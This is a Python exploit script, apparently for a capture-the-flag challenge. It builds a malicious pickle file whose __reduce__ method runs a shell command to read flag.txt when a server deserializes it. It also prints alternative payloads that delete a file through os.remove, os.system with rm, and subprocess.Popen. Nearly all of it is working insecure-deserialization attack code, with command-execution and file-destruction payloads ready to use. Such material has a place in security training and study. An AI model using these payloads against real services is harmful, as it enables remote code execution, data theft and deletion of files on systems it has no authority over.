import pickle
import os

class MaliciousPickle:
    def __reduce__(self):
        # During deserialization, execute subprocess.check_output to read flag.txt
        import subprocess
        return (subprocess.check_output, (['cat', 'flag.txt'],))

# Create malicious object
malicious_obj = MaliciousPickle()

# Serialize to pickle file
try:
    with open('exploit.pkl', 'wb') as f:
        pickle.dump(malicious_obj, f)
    
    # Verify file creation
    if os.path.exists('exploit.pkl'):
        file_size = os.path.getsize('exploit.pkl')
        print("[SUCCESS] Malicious pickle payload created: exploit.pkl")
        print(f"[INFO] File size: {file_size} bytes")
        print("\n[PAYLOAD DESCRIPTION]")
        print("When this pickle is deserialized by the server:")
        print("1. The __reduce__ method returns (subprocess.check_output, (['cat', 'flag.txt'],))")
        print("2. Deserialization executes subprocess.check_output(['cat', 'flag.txt'])")
        print("3. This reads flag.txt contents which appears in server response")
        print("\n[ALTERNATIVE PAYLOADS]")
        print("To delete decoy.txt, use: (os.remove, ('decoy.txt',))")
        print("Or: (os.system, ('rm decoy.txt',))")
        print("Or: (subprocess.Popen, (['rm', 'decoy.txt'],))")
    else:
        print("[ERROR] exploit.pkl was not created")
except Exception as e:
    print(f"[ERROR] Failed: {str(e)}")
